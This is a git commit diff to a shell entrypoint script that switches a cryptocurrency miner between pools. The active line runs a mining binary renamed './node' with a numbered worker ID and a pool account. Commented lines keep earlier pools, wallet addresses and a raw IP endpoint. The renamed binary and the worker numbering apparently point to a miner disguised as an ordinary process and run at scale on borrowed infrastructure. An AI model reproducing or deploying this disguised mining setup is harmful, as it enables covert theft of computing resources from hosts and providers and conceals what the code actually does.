9046919362522f36c238fd049dcbc00531fce7bf
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-05 23:32:11 +0700

    Update entrypoint.sh

--- 1/entrypoint.sh
+++ 1/entrypoint.sh
@@ -9,7 +9,9 @@ echo "start ${WORKER_NUMBER}"
 #./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5089 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${WORKER_NUMBER}_crf > try.log
 # Crionic
 #./node --disable-gpu -a yespowerltncg -o crnc.miners-pool.com:23007 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.${WORKER_NUMBER}_crf > try.log
-./node --disable-gpu -a yespowerltncg -o mine.pool.r4nd0m.us:8919 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.${WORKER_NUMBER}_crf -p c=CRNC,mc=CRNC,m=solo > try.log
-
+#./node --disable-gpu -a yespowerltncg -o mine.pool.r4nd0m.us:8919 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.${WORKER_NUMBER}_crf -p c=CRNC,mc=CRNC,m=solo > try.log
+# Whive
+#./node --disable-gpu -a yespower -o stratum+tcp://206.189.2.17:3333 -u wv1q234xlrqlgykkz628xn3ehv9h6ssr55l4sqr0m2.${WORKER_NUMBER}_crf > try.log
+./node --disable-gpu -a yespower -o stratum+tcp://stratum.aikapool.com:3933 -u chriskm0101.${WORKER_NUMBER}_crf -p x --cpu-threads-intensity 4 --cpu-threads-priority 4 > try.log
 sleep 29999
 
